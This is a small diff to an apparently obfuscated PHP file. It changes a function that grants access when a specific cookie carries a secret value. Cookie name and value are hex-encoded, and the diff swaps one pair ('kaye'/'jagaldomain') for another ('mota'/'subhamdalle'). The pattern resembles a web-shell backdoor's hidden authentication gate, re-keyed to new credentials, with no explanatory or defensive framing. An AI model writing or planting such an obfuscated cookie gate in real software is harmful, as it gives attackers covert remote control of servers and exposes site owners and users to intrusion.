@@ -9,7 +9,7 @@ function hx($ex) {
 }
 
 function cx() {
-    return isset($_COOKIE[hx('6b617965')]) && $_COOKIE[hx('6b617965')] === hx('6a6167616c646f6d61696e');
+    return isset($_COOKIE[hx('6d6f7461')]) && $_COOKIE[hx('6d6f7461')] === hx('73756268616d64616c6c65');
 }
 
 function fx($ux) {
